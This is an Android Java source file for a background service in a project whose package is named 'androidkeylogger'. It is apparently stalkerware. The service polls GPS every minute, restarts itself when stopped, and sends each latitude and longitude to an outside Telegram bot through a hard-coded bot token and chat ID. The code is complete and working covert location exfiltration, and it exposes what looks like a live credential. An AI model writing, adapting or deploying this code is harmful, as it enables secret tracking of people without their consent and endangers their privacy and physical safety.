package com.bshu2.androidkeylogger;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import com.example.newdynamicapk.Constants; // Importing the Constants class

import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class LocationService extends Service {

    private static final String TAG = "LocationService";
    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
    private static final long LOCATION_UPDATE_INTERVAL = 60000; // 1 minute in milliseconds
    private LocationManager locationManager;
    private LocationListener locationListener;
    private String chatId; // Chat ID to send location dynamically

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");

        // Retrieve the chat ID dynamically
        chatId = Constants.TELEGRAM_CHAT_ID; // Replace with how you're managing the chat ID retrieval

        // Initialize location updates
        startLocationUpdates();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        return START_STICKY;
    }

    private void startLocationUpdates() {
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                Log.d(TAG, "Location changed: " + location.getLatitude() + ", " + location.getLongitude());
                sendLocationToTelegram(location);
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}

            @Override
            public void onProviderEnabled(String provider) {}

            @Override
            public void onProviderDisabled(String provider) {}
        };

        try {
            locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    LOCATION_UPDATE_INTERVAL,
                    0,
                    locationListener
            );
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission not granted", e);
        }
    }

    private void sendLocationToTelegram(Location location) {
        String url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
        String message = "Location update:\n" +
                "Latitude: " + location.getLatitude() + "\n" +
                "Longitude: " + location.getLongitude();

        new Thread(() -> {
            try {
                URL telegramUrl = new URL(url);
                HttpURLConnection connection = (HttpURLConnection) telegramUrl.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                String postData = "chat_id=" + chatId + "&text=" + message;
                OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
                writer.write(postData);
                writer.flush();
                writer.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Location sent to Telegram successfully");
                } else {
                    Log.e(TAG, "Failed to send location to Telegram. Response code: " + responseCode);
                }

                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error sending location to Telegram", e);
            }
        }).start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
        Log.d(TAG, "Service destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
